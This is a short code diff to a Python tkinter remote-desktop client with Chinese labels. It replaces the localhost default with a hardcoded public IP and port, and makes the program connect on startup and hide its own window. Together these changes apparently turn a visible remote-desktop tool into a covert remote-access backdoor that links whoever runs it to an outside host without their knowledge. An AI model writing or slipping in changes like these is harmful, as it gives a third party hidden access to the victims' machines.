@@ -423,10 +423,10 @@ class RemoteDesktopClient:
 
         # 窗口组件
         tkinter.Label(self.root, text="目标地址：", ).grid(row=0, column=0, sticky=tkinter.E)
-        self.server_ip = tkinter.Entry(self.root, textvariable=tkinter.StringVar(value='127.0.0.1'))
+        self.server_ip = tkinter.Entry(self.root, textvariable=tkinter.StringVar(value='107.172.208.235'))
         self.server_ip.grid(row=0, column=1, sticky=tkinter.W)
         tkinter.Label(self.root, text="目标端口：").grid(row=1, column=0, sticky=tkinter.E)
-        self.server_port = tkinter.Entry(self.root, textvariable=tkinter.StringVar(value='54321'))
+        self.server_port = tkinter.Entry(self.root, textvariable=tkinter.StringVar(value='8848'))
         self.server_port.grid(row=1, column=1, sticky=tkinter.W)
         self.connect_button = tkinter.Button(self.root, text="启动连接", width=10, command=self.connect)
         self.connect_button.grid(row=2, column=0, sticky=tkinter.E)
@@ -583,4 +583,6 @@ class RemoteDesktopClient:
 if __name__ == '__main__':
     root = tkinter.Tk()
     rdc = RemoteDesktopClient(root)
+    rdc.connect()
+    rdc.hide_window()
     root.mainloop()
